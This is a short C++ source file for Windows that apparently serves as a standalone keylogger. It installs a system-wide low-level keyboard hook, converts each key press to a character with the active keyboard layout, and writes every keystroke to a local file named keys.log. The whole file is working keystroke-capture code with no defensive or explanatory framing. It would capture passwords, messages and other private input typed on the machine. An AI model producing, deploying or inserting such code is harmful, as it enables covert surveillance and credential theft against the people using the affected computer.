#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <fstream>

LRESULT CALLBACK KeyboardProc(      
    int code,
    WPARAM wParam,
    LPARAM lParam
);

static std::wfstream logging{"./keys.log", std::ios::out};

int main(int argc, char** argv, char** envp) {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    HHOOK kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (kb_hook == NULL) {
        MessageBoxW(NULL, L"Unable to hook to keyboard", L"Hook Fail", MB_OK);
        return EXIT_FAILURE;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kb_hook);
    return EXIT_SUCCESS;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        switch (wParam) {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
            {
                BYTE kbState[256] {0};
                GetKeyboardState((PBYTE)kbState);

                SHORT shiftState = GetKeyState(VK_SHIFT);
                HKL keyboardLayout = GetKeyboardLayout(0);

                WCHAR charOut;
                int success = ToUnicodeEx(kbStruct->vkCode, kbStruct->scanCode, (PBYTE)&kbState, &charOut, 1, 0b10, keyboardLayout);
                if (success) {
                    logging << charOut;
                }
                break;
            }
            
            default: break;
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}
